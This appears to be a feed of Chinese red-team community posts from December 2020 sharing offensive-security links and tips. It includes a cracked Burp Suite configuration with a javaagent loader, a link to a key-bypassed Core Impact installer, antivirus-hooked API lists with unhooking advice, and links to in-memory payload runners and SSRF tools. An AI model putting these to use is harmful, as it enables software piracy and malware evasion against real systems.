`#Mac工具#`  <br>BurpSuite12.1 <br>国内下载很慢,我传到百度云,破解使用[https://github.com/TrojanAZhen/BurpSuitePro-2.1](https://github.com/TrojanAZhen/BurpSuitePro-2.1)<br><br>链接: [https://pan.baidu.com/s/1mdXaPovsSL480JCLgFHEIg](https://pan.baidu.com/s/1mdXaPovsSL480JCLgFHEIg) 提取码: Wing 复制这段内容后打开百度网盘手机App，操作更方便哦 <br>--来自百度网盘超级会员v5的分享<br><br>截图<br><br>再分享下我自己Mac破解的方法<br><br>把loader放在图三位置<br>vmoptions内容如下<br><br># Enter one VM parameter per line<br># For example, to adjust the maximum memory usage to 512 MB, uncomment the following line:<br># -Xmx512m<br># To include another file, uncomment the following line:<br># -include-options [path to other .vmoption file]<br><br>-XX:MaxRAMPercentage=50<br>-include-options user.vmoptions<br>-noverify <br>-javaagent:$APP_PACKAGE/Contents/Resources/app/Burploader2020_x.jar <br><br>前提是先手动激活一下,就能直接用了
![](https://images.zsxq.com/FtVS4t01sgA5HIdnEAYKD3oz8zdU?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:3WJoOj73uxvBUDWXQW_CPVkNt4Y=)
![](https://images.zsxq.com/FpbEsijo6pKpZMwLB2GYXZGZFgFn?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:z0P8yVaSzh6uQLyit1LUGdciFYk=)
![](https://images.zsxq.com/FlXRf4SwpuTHpaaqfWivhQxmh964?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:y-0CUEEGaptaa_TJpEqTtEGzywQ=)
![](https://images.zsxq.com/FjZ--1c06cb4d9fbjq2n4VX1bHBE?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Ct0jegbANN0qEKB3rLZzR7FoKcY=)

# RedTeaming - 2020-12-19
`#没啥用的Tips#` <br>IDEA 快速返回上次查看代码的位置<br><br>[https://blog.csdn.net/u010814849/article/details/7...](https://blog.csdn.net/u010814849/article/details/76682701)


# RedTeaming - 2020-12-19
`#CSTips#` <br>CS作者最近出了CoreImpact和CS联动的教程<br>[https://www.youtube.com/watch?v=9U-hRXsDsis&featur...](https://www.youtube.com/watch?v=9U-hRXsDsis&feature=youtu.be)<br><br>但是这个玩意搞不到

```
ㅤ: [https://raidforums.com/Thread-CORE-IMPACT-20-1-620...](https://raidforums.com/Thread-CORE-IMPACT-20-1-6201-Binary-PLAIN-Key-Bypassed-Installer-Only)
Wing: 你有下吗，这个站我没充钱
```
# RedTeaming - 2020-12-20
 `#CSTips#` <br>国外论坛下的一个kit包
![](https://images.zsxq.com/FkpPjZTQa0-ExT3RVAmIimpwoCgZ?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:bVNZmRJ97l-NgXlb7jStmE_OQSg=)

# RedTeaming - 2020-12-21
[SSP武器化](https://mp.weixin.qq.com/s/YBAnFbgNd7Q0Eif3Q119qg)


# RedTeaming - 2020-12-21
`#漏洞利用#`  <br>ssrf 的漏洞利用工具。<br><br>[GitHub+-+firebroo/sec_tools](https://github.com/firebroo/sec_tools)


# RedTeaming - 2020-12-21
`#漏洞利用#` <br><br>[Ssrf引发的血案](https://mp.weixin.qq.com/s/5nnJEfAFZsqzxq_2-UPZCw)


# RedTeaming - 2020-12-21
`#免杀#` <br>好家伙<br>[GitHub+-+rvrsh3ll/NoMSBuild:+MSBuild+without+MSbui...](https://github.com/rvrsh3ll/NoMSBuild)


# RedTeaming - 2020-12-22
`#没啥用的Tips?#`  <br>一起来重装系统吧<br><br>复制这段内容后打开百度网盘App，操作更方便哦。<br>链接：[https://pan.baidu.com/s/1J9vWlQPMovLsd3ZWTgGsHg](https://pan.baidu.com/s/1J9vWlQPMovLsd3ZWTgGsHg) <br>提取码：f68a --来自百度网盘超级会员V5的分享
![](https://images.zsxq.com/FsUuZ0R6y5Yp_bY60GS_EqPwRtmq?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:3O412irh92Dmw0AhILXKfRBJ-SY=)

# RedTeaming - 2020-12-22
关于前几天写免杀工具的碎碎念，目前大多数 AV 都会去 HOOK，KERNELBASE.DLL，NTDLL.DLL，KERNEL32.DLL
<br> 中的关键 API（不考虑.sys 的情况下)，以 Norton 为例:
<br>VirtualAllocEx
<br>CreateFileMappingW
<br>CreateFileMappingNumaW
<br>CreateFileW
<br>MapViewOfFile
<br>VirtualProtect
<br>HeapCreate
<br>VirtualAlloc
<br>MapViewOfFileEx
<br>CreateRemoteThreadEx
<br>WriteProcessMemory<br> 等等都是 HOOK 的范围，那么这时候 shells.system 中的 unhook 手法就用上了。最好能有一份速查表就好了，遇上什么查什么。

```
RainismG: [GitHub+-+D3VI5H4/Antivirus-Artifacts:+Anti-virus+a...](https://github.com/D3VI5H4/Antivirus-Artifacts)
```
# RedTeaming - 2020-12-22
`#Mac工具#`  <br>JB全家桶插件式激活<br>[Jetbrains系列产品重置试用方法+|+知了](https://zhile.io/2020/11/18/jetbrains-eval-reset.html)


# RedTeaming - 2020-12-22
`#免杀#`  <br>把bin文件加密压缩后使用这个工具运行.<br>可以解密后内存运行.我这里测试出点问题,不知道是不是360压缩的问题,大家测试成功的发下截图<br>[GitHub+-+jfmaes/SharpZipRunner:+Executes+position+...](https://github.com/jfmaes/SharpZipRunner)


# RedTeaming - 2020-12-22
 `#碎碎念#` <br>zsxq有什么好点的爬虫吗,想把2020年之前的东西按照标签爬一下.

```
Wing: 需要整理下
裤衩哥: 你试试那个 sitetru 什么什么的那个
Wing: 爬一会被检测到账号就会被强制退出
```
